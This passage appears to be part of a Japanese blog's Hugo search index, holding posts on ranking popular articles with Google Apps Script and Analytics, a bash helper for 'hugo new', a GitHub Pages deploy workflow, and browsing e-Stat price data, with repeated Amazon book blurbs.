Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-07T10:03:12+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-07-01-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-07-01-suzuki/","title":"【はじめから】ざっくりわかるシェルスクリプト１」"},{"content":"Hugoにはさまざまな機能があり、ブログを作るにはもってこいの静的サイトジェネレーターです。\n関連記事も取得できて、検索機能もある「至れり尽くせり」なジェネレーターだと思います。\nしかし、1点だけどうしても重要な機能がありません。\nそれは人気記事の表示です。\n人気記事を表示させようとすると、データベースを用意したりサーバのアクセスカウントを行う必要があります。\nそんな面倒なことはしたくありませんよね？\n今回はHugoでも簡単に人気の記事を表示する方法を紹介いたします。\n必要なもの Hugoで人気記事を出すために必要なものは、\nGoogleスプレッドシート Googleアナリティクス 以上です。\nそれでは実際の設定やプログラムを行っていきましょう。\nGoogleアナリティクスの設定 Googleアナリティクスをサイトに設定します。\n設定の際にはv4ではなく、v2が必要です。(2022年1月6日現在）\nv4を設定している場合は、同時にv2も設定する必要があります。\n「アカウントを作成」「アカウントの設定」をした後に、「プロパティの設定」で「ユニバーサル アナリティクス プロパティの作成」をONにするとv4とv2の両方でアナリティクスを設定できます。\nユニバーサル アナリティクス プロパティの作成 あとはv4とv2のコードをサイトに貼り付けるだけです。\n貼り付け方法はGoogleに書いてある通りです。\nスプレッドシートの設定 次にスプレッドシートを設定します。\nGoogleドライブで「新規」「Googleスプレッドシート」を選択してシートを作成します。\n作成したシートに適当な名前をつけます。\nその後に、「拡張機能」の「App Script」を押して、GoogleAppScript（GAS）に移動します。\nユニバーサル アナリティクス プロパティの作成 GASのプログラム 日付の取得 日付を計算するために、「daysjs」というライブラリを追加します。\nライブラリの＋をクリックして、以下を検索します。\n1ShsRhHc8tgPy5wGOzUvgEhOedJUQD53m-gd8lG2MOgs-dXC_aCZn9lFB 検索して、days.jsが表示されたら追加をします。\nday.jsライブラリの追加 これで日付の検索が可能になります。\n以下が日付のプログラムです。\n今日から1日、1月、1年前なのかという切り替えが可能です。\nyear: 今日から1年間の範囲 month: 今日から1か月の範囲 day: 今日から1日の範囲 function getDate(type) { let calc = \u0026#39;d\u0026#39;; switch(type) { case \u0026#34;month\u0026#34;: calc = \u0026#39;M\u0026#39;; break; case \u0026#34;year\u0026#34;: calc = \u0026#39;y\u0026#39;; break; default: calc = \u0026#39;d\u0026#39;; break; } const d1 = dayjs.dayjs().locale(\u0026#39;ja\u0026#39;); return {start: d1.subtract(1, calc).format(\u0026#39;YYYY-MM-DD\u0026#39;), end: d1.format(\u0026#39;YYYY-MM-DD\u0026#39;)}; } function test() { let d = getDate(\u0026#39;day\u0026#39;); console.log(d); } ここまでをテスト実行してみましょう。\nデバッグの隣りにあるセレクトを「test」にして、「実行」を押してみます。\n正常に終了されれば実行ログに結果と実行完了が表示されるはずです。\nGASとGoogleアナリティクスの連携 GASとアナリティクスの連携にはビューIDが必要です。\nビューIDはv2で取得できるので、v4とv2を設定したのはこのビューIDを取得するためになります。\nGASのプログラムにGoogleアナリティクスの「アカウント」「プロパティ」「ビュー」「ビューの設定」にあるビューIDを設定します。\n設定する際は「ga:ビューID」と ga: を付ける必要があります。\nさきほどのプログラムの下に、下記のプログラムを記述します。\nfunction getGoogleAnalytics(name) { const id = \u0026#34;ga:[GAビューID]\u0026#34;; const date = getDate(name); const response = AnalyticsReporting.Reports.batchGet({ reportRequests: [{ viewId: id, dateRanges: [{startDate:date.start,endDate: date.end}], samplingLevel: \u0026#39;LARGE\u0026#39;, metrics: [ {expression: \u0026#39;ga:pageviews\u0026#39;}, {expression: \u0026#39;ga:sessions\u0026#39;}, {expression: \u0026#39;ga:users\u0026#39;}, ], dimensions: [ {name: \u0026#39;ga:pagePath\u0026#39;} ], orderBys: [{ fieldName: \u0026#39;ga:pageviews\u0026#39;, sortOrder: \u0026#34;DESCENDING\u0026#34;, }], }] }); let rows = JSON.parse(response).reports[0].data.rows; rows = rows.filter(f =\u0026gt; /posts/.test(f.dimensions[0])).map(f =\u0026gt; { return f.dimensions.concat(f.metrics[0].values); }); let sheet = SpreadsheetApp.getActive().getSheetByName(name); sheet.clear(); rows.unshift([\u0026#34;link\u0026#34;, \u0026#34;pv\u0026#34;, \u0026#39;session\u0026#39;, \u0026#39;users\u0026#39;]); sheet.getRange(1, 1, rows.length, rows[0].length).setValues(rows); } function setMonth() { getGoogleAnalytics(\u0026#39;month\u0026#39;); } ここでは、ページのパスをキーとしてページビューとセッション、ユーザー数を集計するようにしています。\n並び順はpageviewsの数の降順です。\n必要なデータがあれば各自で編集することをオススメいたします。\nそして、各項目のラベルを出力するために、\nrows.unshift([\u0026#34;link\u0026#34;, \u0026#34;pv\u0026#34;, \u0026#39;session\u0026#39;, \u0026#39;users\u0026#39;]); として、先頭行のデータにラベル行を追加しています。\nこの部分も各自のデータに合うよう、調整してください。\nアナリティクスから取得したデータはスプレッドシートのシート名に紐付けるので、\ngetGoogleAnalytics(\u0026#39;month\u0026#39;); の場合は、「month」というシートにデータを反映するということになります。\nサービスの読み込み GASとアナリティクスを連携させるために、サービスを読み込みます。\nサービスのプラスマークをクリックして、「Analytics Reporting API」を選択、追加します。\n以上でサービスの読み込みは終わりです。\nそれでは、実行してみましょう。\n実行 まずははスプレッドシートに「month」という名前のシートを作ります。\nシートができたら、再度コードエディターに戻ります。\nさきほどのデバッグの隣りにあるセレクト「test」を「setMonth」にして、実行を押します。\n承認を求められるので、「権限を確認」を押します。\n使用するアカウントをクリクで選んで、「詳細」をクリックして、「〜（安全ではないページ）に移動」をクリックします。\nすると、アクセスの許可を求められるので、「許可」を押します。\n実行ログに結果と実行完了が表示されるはずです。\nスプレッドシートを確認すると、アナリティクスのデータが反映されているはずです\nこれで月間の人気記事の取得ができました。\n同じように日、年も設定しておきましょう。\nfunction setDay() { getGoogleAnalytics(\u0026#39;day\u0026#39;); } function setYear() { getGoogleAnalytics(\u0026#39;year\u0026#39;); } まとめ まずがGASとアナリティクスの連携ができました。\n次回はこのデータを使ってHugoとアナリティクスを連携して、人気記事を表示できるようにしたいと思います。\nここまでの全プログラムは下記になります。\nfunction getDate(type) { let calc = \u0026#39;d\u0026#39;; switch(type) { case \u0026#34;month\u0026#34;: calc = \u0026#39;M\u0026#39;; break; case \u0026#34;year\u0026#34;: calc = \u0026#39;y\u0026#39;; break; default: calc = \u0026#39;d\u0026#39;; break; } const d1 = dayjs.dayjs().locale(\u0026#39;ja\u0026#39;); return {start: d1.subtract(1, calc).format(\u0026#39;YYYY-MM-DD\u0026#39;), end: d1.format(\u0026#39;YYYY-MM-DD\u0026#39;)}; } function getGoogleAnalytics(name) { const id = \u0026#34;ga:[GAビューID]\u0026#34;; const date = getDate(name); const response = AnalyticsReporting.Reports.batchGet({ reportRequests: [{ viewId: id, dateRanges: [{startDate:date.start,endDate: date.end}], samplingLevel: \u0026#39;LARGE\u0026#39;, metrics: [ {expression: \u0026#39;ga:pageviews\u0026#39;}, {expression: \u0026#39;ga:sessions\u0026#39;}, {expression: \u0026#39;ga:users\u0026#39;}, ], dimensions: [ {name: \u0026#39;ga:pagePath\u0026#39;} ], orderBys: [{ fieldName: \u0026#39;ga:pageviews\u0026#39;, sortOrder: \u0026#34;DESCENDING\u0026#34;, }], }] }); let rows = JSON.parse(response).reports[0].data.rows; rows = rows.filter(f =\u0026gt; /posts/.test(f.dimensions[0])).map(f =\u0026gt; { return f.dimensions.concat(f.metrics[0].values); }); let sheet = SpreadsheetApp.getActive().getSheetByName(name); sheet.clear(); rows.unshift([\u0026#34;link\u0026#34;, \u0026#34;pv\u0026#34;, \u0026#39;session\u0026#39;, \u0026#39;users\u0026#39;]); sheet.getRange(1, 1, rows.length, rows[0].length).setValues(rows); } function setMonth() { getGoogleAnalytics(\u0026#39;month\u0026#39;); } function setDay() { getGoogleAnalytics(\u0026#39;day\u0026#39;); } function setYear() { getGoogleAnalytics(\u0026#39;year\u0026#39;); } 書籍の紹介 1週間でGoogleアナリティクス4の基礎が学べる本 (1週間で基礎が学べるシリーズ) 大幅に改訂されたWebマーケティングツール「Googleアナリティクス4」の基礎と活用法を最前線のWebマーケッターたちがやさしく解説! 本書は、WebマーケターのためにGoogleアナリティクス4（GA4・ジーエーフォー）の基礎知識を解説した入門書です。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 詳解! Google Apps Script完全入門[第2版] ~GoogleアプリケーションとGoogle Workspaceの最新プログラミングガイド 今や私たちの仕事や生活に無くてはならない存在になったGoogleサービス。これらGoogleサービスの自動化や連携を行うことで、大幅な効率化が図れます。そして、それを可能にするのがGoogle Apps Script(GAS)です。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-06T16:50:50+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-06-01-wyoshi/analytics_hu3c7150185aea2714a4cee994a799664f_79251_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-06-01-wyoshi/","title":"簡単にできるHugoで人気の記事を表示する方法を詳しく解説"},{"content":"はじめに ここでは、hugoコマンドでnewする時に指定するファイル名を、シェルスクリプトを使ってなるべく簡便にあてはめてファイル生成しようというものです。\nhugo コマンドでgithub.ioディレクトリに記事を投稿する場合、以下のコマンドをたたくと思います。\n$ hugo new posts/＜ディレクトリ＞/index.md または\n$ hugo new posts/＜今日の日付＞.md 面倒なんですよね。。。\nディレクトリの指定 通常、記事毎にディレクトリを分けて、アクセスされるファイルをindex.mdにした場合は、以下の通りになりますよね。\n$ hugo new posts/＜今日の日付のディレクトリ＞/index.md ナンバリングの効用 ただ、同日に気分が乗ってきて、もう一つ記事を投稿しようとする場合は、日付の後ろに「-02」とか工夫する必要も出てきたりします。たとえば以下のように\n$ hugo new posts/＜今日の日付のディレクトリ＞-＜ナンバリング02＞/index.md 複数メンバーの投稿を区別する 複数のコラボレーターで投稿するgithub.ioの場合は、投稿者も区別したくなります。例えば\n$ hugo new posts/＜今日の日付のディレクトリ＞-＜作成者＞-＜ナンバリング02＞/index.md ようするに、シェルスクリプトを使って、以下のコマンドを実行したい訳です。\n$ hugo new posts/2022-01-06-01-suzuki/index.md 起動パラメータ と、なると、パラメータは以下の三つとなりますね。\n$today 今日の日付\n$number 記事のナンバリング\n$author 作成者\n実行イメージ # 作成者 suzuki の 01 番目の投稿記事 $ bash mkArticle.sh suzuki 01 $ hugo new posts/$today-$number-$author/index.md 気をつけるところは パラメータを省略したときの挙動 $ bash mkArticle.sh 実行した場合に、「作成者が指定されていないからやりなおしてね」というのもちょっと寂しいものがあります。指定していなければ、都度、聞いてきて欲しいものです。そこで readコマンドで作成者を尋ねてくる感じにします。\nif [ -z \u0026#34;$author\u0026#34; ]; then echo \u0026#34;ユーザー名を半角で入力\u0026#34;; read author; fi 同日ファイルの存在を確認 ２．すでに同日に一つ目の記事を投稿してある。要するに生成しようとしているファイルがすでに存在する場合の挙動です。こちらは、ファイルが存在していれば、１を応用して、別のナンバリングを指定するように尋ねてくれると良さそうです。\nwhile [ true ] ;do if [ -f \u0026#34;content/posts/$today-$number-$author/index.md\u0026#34; ]; then echo \u0026#34;$number ファイルが既に存在します。\u0026#34;; echo \u0026#34;別のナンバリングを指定して下さい 02とか03とか\u0026#34;; read number; else break; fi done ですので、ナンバリングの初期値は「01」としておいて、そのファイルが既に存在する場合は、あらためてユーザーにナンバリングを尋ねてくるという手法としました。\nif [ -z \u0026#34;$number\u0026#34; ]; then number=\u0026#34;01\u0026#34;; fi 実行方法 $ bash mkArticle.sh suzuki 01; 前述のとおり作成者、ナンバリングは省略可能です。 $ bash mkArticle.sh ソース全文 #!/bin/bash : \u0026#39;使い方 一つ目のパラメーターに作成者を指定します 二つ目のパラメータにナンバリングを指定します 一つ目 01(未指定の場合は01） 二つ目 02 （例) $ bash mkArticle.sh suzuki 01; \u0026#39; # #作成者 無指定であれば入力を促す author=$1; #今日の日付 today=$(date \u0026#34;+%Y-%m-%d%n\u0026#34;); #今日のインデクス 一つ目の投稿であれば01 二つ目の投稿であれば02 number=\u0026#34;$2\u0026#34;; # function getParam(){ if [ -z \u0026#34;$number\u0026#34; ]; then number=\u0026#34;01\u0026#34;; fi # if [ -z \u0026#34;$author\u0026#34; ]; then echo \u0026#34;ユーザー名を半角で入力\u0026#34;; read author; fi # while [ true ] ;do if [ -f \u0026#34;content/posts/$today-$number-$author/index.md\u0026#34; ]; then echo \u0026#34;$number ファイルが既に存在します。\u0026#34;; echo \u0026#34;別のナンバリングを指定して下さい 02とか03とか\u0026#34;; read number; else break; fi done } # function execHugo(){ echo \u0026#34;\u0026#34;; echo \u0026#34;hugoコマンドを実行します\u0026#34;; echo \u0026#34;hugo new posts/$today-$number-$author/index.md\u0026#34; hugo new posts/$today-$number-$author/index.md # 処理終了 echo \u0026#34;ファイルの編集は以下の通りです。\u0026#34; echo \u0026#34;vim content/posts/$today-$number-$author/index.md;\u0026#34; } # # パラメータの取得 getParam; # hugoコマンドの実行 execHugo; exit; # おわりに 日頃、手間を掛けてコマンドを入力している場合は、シェルスクリプトを使って簡便にできる事に加え、さらにカスタマイズを加え、便利に記事投稿ができるとブログも気分もがぜん盛り上がりますね。\n書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-06T14:21:51+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-06-01-suzuki/2021-12-23-bash_hu3f93fa107d6ed2da910fda4d86a52d3c_22108_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-06-01-suzuki/","title":"シェルスクリプトをつかって、hugoで楽ちんにファイルを作成して編集できないかっていうはなし"},{"content":"デザイナーでもできるはじめてのHugoの2回目になります。\n前回（デザイナーでもできるはじめてのHugo #01）はHugoのインストールから公開の方法までを説明しました。\n今回は前回作成したページをGitHub Pagesを使って公開してみたいと思います。\nGitHub Pages用の設定ファイルを作成 GitHub PagesはGitHubにあるコンテンツを静的ページを公開する機能です。\nSSLまでついているので、非常に便利です。\n公開用のファイルは.github/workflows/gh-pages.ymlというYAML形式のファイルになります。\nname: Hugo on: push: # schedule: # - cron: \u0026#39;*/10 * * * *\u0026#39; jobs: gh-pages: runs-on: ubuntu-latest steps: - name: Checkout uses: actions/checkout@v2 with: persist-credentials: false submodules: true # Fetch Hugo themes (true OR recursive) fetch-depth: 0 # Fetch all history for .GitInfo and .Lastmod # https://github.com/marketplace/actions/github-pages-action - name: Setup uses: peaceiris/actions-hugo@v2 with: hugo-version: \u0026#39;latest\u0026#39; extended: true - name: Build run: hugo --minify - name: Deploy uses: peaceiris/actions-gh-pages@v3 with: github_token: ${{ secrets.GITHUB_TOKEN }} publish_branch: gh-pages nameはGitHubでのActionsに表示される名前です。\n今回は公開用としてgh-pagesというブランチにわけています。ここおらへんはお好みで設定してください。\nhugoでテーマを使っている場合はsubmodules: trueとする必要があります。\nまた、Hugoで更新日をGitの日付と合わせたい場合はfetch-depth: 0として、Gitの履歴を取得するようにしましょう。\nGitHub Pagesの設定 GitHub PagesのURLはhttps://ユーザまたは組織名.github.io/リポジトリ名となります。\nGitHubでリポジトリを作成する際に「ユーザまたは組織名.github.io」とすると「https://ユーザまたは組織名.github.io」とすることができます。\nまずはさきほどのファイルを含めてサイト全体をGitにアップして、gh-pagesというブランチが作られるのを待ちましょう。\nその後に、setings \u0026gt; PagesにでGitHub Pagesの設定を行います。\nGitHub Pagesの設定 Your GitHub Pages site is currently being built from the gh-pages branch\nにあるBranchをgh-pagesに変更します。\n設定は以上です。\nHugoの初期設定であればpublishDir: publicとなっているので、GitHub Pagesではpublicがルートディレクトリとして公開されます。\n.gitignoreに「public」を除外するようにしておきましょう。\n/public /resources 最後に設定したURLへアクセスするとサイトが確認できると思います。\nまとめ GitHub Pagesを使えば、難しいサーバの設定などをすることなく、無料でSSL付きのサイトを公開することが可能です。\nいくつかの制限はありますが、すごく便利な機能なのでみなさんもぜひ使ってみてはいかがでしょうか。\n公開する際はパスワードなどの情報も一緒にアップしないよう、気をつけてください。\nオススメの書籍 いちばんやさしいGit\u0026amp;GitHubの教本 人気講師が教えるバージョン管理＆共有入門 「いちばんやさしい教本」シリーズ 実際のワークフローをイメージしながら 実践的なGit/GitHubの使い方が身につく「いちばんやさしい」入門書です。 前半は、手元のパソコンでファイルを実際にバージョン管理しながら、 Gitの基本的な使い方を解説。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 Web制作者のためのGitHubの教科書 チームの効率を最大化する共同開発ツール そろそろ「プルリ」しませんか?しくみを理解して使えば怖くない。リポジトリの作成から複数デザインの提示、「Pull Request」を使った分担作業まで、Webサイト制作を例に実践的なワークフローを身に付ける。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2021-12-28T12:07:19+09:00","image":"https://suzukiiichiro.github.io/posts/2021-12-28-hugo-02-ywat/settings_hub5e89b620d2afe5c10cf3894738f1203_124480_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2021-12-28-hugo-02-ywat/","title":"GitHub Pagesを使って無料でSSL付きのサイトを公開する"},{"content":"私のe-Statでのデータマイニングの現在の目的は以下の通りです\n大量の政府公開データの中から\n①面白そうなデータをピックアップする\n②データをわかりやすくサマライズする\n・列情報などを必要な項目に絞り込む\n・前年度比５倍とか急激な変化があった場合をピックアップできるようにする\n最終的にはこれらを自動でできるようにしたいです。\n今回は、まず①面白そうなデータをピックアップすることを目的にe-Statを見てみましょう。\nランキングページを見てみよう e-Statのトップページ（https://www.e-stat.go.jp/）の画面の下の方にランキングという欄があります。\nそのランキングの現在(2021/12/26)３位が「アイスクリーム」なんです。\nランキング アイスクリームが含まれるのはどんなデータか 「アイスクリーム」は柔らかめのキーワードなので面白いデータの予感がします。\n「アイスクリーム」が含まれるデータはどんなデータなんでしょうか？\nちょっと見てみましょう。\nhttps://www.e-stat.go.jp/stat-search?page=1\u0026query=%E3%82%A2%E3%82%A4%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%BC%E3%83%A0\u0026layout=dataset\nアイスクリーム 「アイスクリーム」が含まれるデータは7640件あるみたいです。\nちょっと多いですね。。。\n検索条件なのですが、提供分類、表題を検索　データベース、ファイル内を検索にチェックがついています。\n「検索のしかた」をみてみるとキーワードのOR検索やAND検索もできそうです。\n検索のしかた ちなみに検索キーワードでの絞り込みはAPI(統計表情報取得)でももちろんできます。\ncurl \u0026#34;https://api.e-stat.go.jp/rest/3.0/app/getSimpleStatsList?appId=xxxxxxxxxx\u0026amp;searchWord=アイスクリーム\u0026#34; アイスクリームだと数が多すぎるので試しに「ガリガリ君」で検索してみましたが、0件でした。「ハーゲンダッツ」で検索したところ22件引っかかってきました。\nハーゲンダッツ 「ハーゲンダッツ」どこに出てくるのかなと思ってAPIを一通り叩いてみたのですがAPIの実行結果からは「ハーゲンダッツ」は見つけられませんでした。\nエクセル表示を見てみたところ、「銘柄」という項目に「バニラアイスクリーム，カップ入り（110mL入り），「ハーゲンダッツ バニラ」」とありました。\nどうも全国のアイスクリームの価格を「ハーゲンダッツ　バニラ」を基準に算出しているみたいです。\nexcel ちなみに、2020年だと１番安いのが長野市の221円で１番高いのが那覇市の300円でした。\n統計表 単にハーゲンダッツの価格ってだけだと少しパンチ力弱いかもしれませんね。。。\n個人的には明治のスーパーカップが１位でジャンボモナカが２位でとかアイスクリーム売れ筋ランキングとかの方が楽しいのですが、政府はそこまで調べてくれないですよね。\n小売統計調査とは 小売物価統計調査はお米の価格から葬儀代まで約８００の小売価格を調査したデータ\n調査結果は、年金等の給付見直しの際の基礎資料や、公共料金の上限値を決める際の資料として、幅広く利用されているそうです。\nアイスクリームは約８００ある中の項目の一つです。\n銘柄 小売物価統計調査をピックアップするとしたら、ここ数年で値段が大きく変化しているものや地域間の差が特に大きいものとかですかね。\n「小売物価統計」でgoogle検索して面白そうな記事を見てみると\n「今年のX’マスケーキは小さくなるか」という記事がありました。\nケーキにもよく使われる小麦や油量種子はとりわけ高騰が目立つ\n→\n小売物価統計調査によると、東京都区部の小売価格で、今年11月の1kgあたりの小麦価格は1年前より約20円上昇した。食用油に至っては1kgあたり約60円と大幅な値上がりで、価格が比較的安定している食品の代名詞ともなってきた鶏卵でさえ、1パックあたり約12円上昇した。\n→\nクリスマスイブにケーキを買って帰る人も多いだろうが、今年は例年と比べて値段がほとんど同じなのにサイズが小さくなっていても不思議ではない。\nこんな感じのものは自動的にピックアップできると理想的なんですけどね。\n今日のところのまとめ 自動的にピックアップするとしたら\n・柔らかめのキーワード\n・ここ数年間で値が急激に変化してるもの\n・地域間の格差が大きいもの\nですかね。データを見ていって判定項目を増やしていきたいと思います。\nその他、アイスクリームでの検索結果には「家計調査」というのもありました。\n家計の４半期での支出額の平均を出したものなのですが、アイスクリームの支出は当然夏が冬の倍くらい多い感じになってます。\nアイスクリームは当たり前ですが、その他季節によって大きく支出が違うものって何なのかは少し興味がありますね。\n毎月や四半期ごとに値があるものについては、期間によって差が大きいものはピックアップしても良いかもしれませんね。\n家計調査 書籍の紹介 UNIXという考え方―その設計思想と哲学 単行本 – 2001/2/23 UNIX系のOSは世界で広く使われている。UNIX、Linux、FreeBSD、Solarisなど、商用、非商用を問わず最も普及したOSのひとつであろう。そしてこのOSは30年にわたって使用され続けているものでもある。なぜこれほど長い間使われてきたのか？ その秘密はUNIXに込められた数々の哲学や思想が握っている。 そもそもUNIXはMulticsという巨大なOSの開発から生まれたものだ。あまりに巨大なMulticsはその複雑さゆえに開発は遅々として進まず、その反省からケン・トンプソンが作ったのがUNIXの初めとされる。その後デニス・リッチーら多数の開発者が携わり、UNIXは発展した。本書はこのUNIXに込められた「思想と哲学」を抽出し、数々のエピソードとともにUNIXの特徴を浮き彫りにしていく。 たとえば本書で述べられているUNIXの発想のひとつとして「過度の対話式インタフェースを避ける」というものがある。UNIXのシステムは初心者には「不親切」なつくり、つまり親切な対話式のインタフェースはほとんどなく、ユーザーがコマンドを実行しようとするときはオプションをつける形をとっている。この形式はオプションをいちいち覚えねばならず、初心者に決してやさしくない。しかしこれはプログラムを小さく単純なものにし、他のプログラムとの結合性を高くする。そして結果としてUNIXのスケーラビリティと移植性の高さを支えることになっているのだ。このような形式で本書では9つの定理と10の小定理を掲げ、UNIXが何を重視し、何を犠牲にしてきたのかを明快に解説している。\n最終章にはMS-DOSなどほかのOSの思想も紹介されている。UNIXの思想が他のOSとどう違うかをはっきり知ることになるだろう。UNIXの本質を理解するうえで、UNIX信者もUNIX初心者にとっても有用な1冊だ。（斎藤牧人）\nAmazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\n詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 